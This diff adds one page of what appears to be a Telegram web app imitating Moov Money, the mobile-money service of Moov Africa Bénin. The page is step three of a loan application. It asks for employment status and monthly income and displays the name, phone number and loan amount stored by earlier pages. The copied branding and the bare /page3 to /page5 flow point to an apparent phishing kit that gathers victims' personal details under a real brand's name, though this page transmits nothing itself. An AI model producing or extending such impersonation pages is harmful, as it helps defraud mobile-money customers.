@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money - Résumé de la Demande</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --moov-orange: #f26522;
+            --moov-blue: #004b87;
+            --bg-color: #e5e5e5;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        .app-header {
+            width: 100%; background-color: var(--moov-blue); height: 60px; padding: 0 20px;
+            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
+            border-bottom: 3px solid var(--moov-orange);
+        }
+        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; }
+        .header-title .moov { color: var(--moov-orange); margin-right: 4px; }
+        .header-title .money { color: #ffffff; }
+
+        .card {
+            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
+            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); display: flex; flex-direction: column;
+        }
+        .main-title { font-size: 26px; color: var(--moov-blue); margin: 0 0 6px; text-align: center; font-weight: 800; }
+        .subtext { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }
+
+        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
+        .step-bar.active { background-color: var(--moov-orange); }
+
+        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; }
+        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid #cbd5e1; border-radius: 10px; outline: none; width: 100%; }
+        
+        .summary-card {
+            background-color: #f0f4f8; border-left: 4px solid var(--moov-orange);
+            padding: 18px 16px; border-radius: 10px; margin: 10px 0 24px;
+        }
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #e2e8f0; font-size: 13.5px; }
+        .summary-label { color: #666; }
+        .summary-value { font-weight: 700; color: #111; }
+
+        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
+        .btn-prev { background-color: #e8e8e8; color: #555; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
+        .btn-next { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
+    </style>
+</head>
+<body>
+
+<div class="app-header">
+    <a href="/page3" class="back-btn">← Retour</a>
+    <div class="header-title">
+        <span class="moov">Moov</span><span class="money">Money</span>
+    </div>
+    <div style="width:24px;"></div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 3 sur 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <form onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">Statut Professionnel</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Employé" selected>Employé(e)</option>
+                <option value="Entrepreneur / Commerçant">Entrepreneur / Commerçant</option>
+                <option value="Étudiant">Étudiant(e)</option>
+                <option value="Sans emploi">Sans emploi</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">Revenu Mensuel Moyen (FCFA)</label>
+            <input type="number" id="income" class="form-control" placeholder="Ex: 300000" required>
+        </div>
+
+        <div class="summary-card">
+            <h3 style="margin:0 0 12px 0; font-size:16px; color:var(--moov-blue);">Résumé</h3>
+            <div class="summary-row"><span class="summary-label">Montant :</span><span class="summary-value" id="sumAmount">--</span></div>
+            <div class="summary-row"><span class="summary-label">Durée :</span><span class="summary-value" id="sumDuration">--</span></div>
+            <div class="summary-row"><span class="summary-label">Demandeur :</span><span class="summary-value" id="sumName">--</span></div>
+            <div class="summary-row"><span class="summary-label">Téléphone :</span><span class="summary-value" id="sumPhone">--</span></div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="window.location.href='/page3'">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">SOUMETTRE LA DEMANDE</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">© 2026 Moov Africa Bénin</div>
+
+<script>
+window.onload = () => {
+    document.getElementById('sumAmount').innerText = (localStorage.getItem('loan_amount') || '250000') + " FCFA";
+    document.getElementById('sumDuration').innerText = (localStorage.getItem('loan_term') || '12') + " Mois";
+    document.getElementById('sumName').innerText = `${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}`;
+    document.getElementById('sumPhone').innerText = "+229 " + (localStorage.getItem('phone') || '');
+};
+
+function submitForm(e) {
+    e.preventDefault();
+    window.location.href = "/page5";
+}
+</script>
+</body>
+</html>
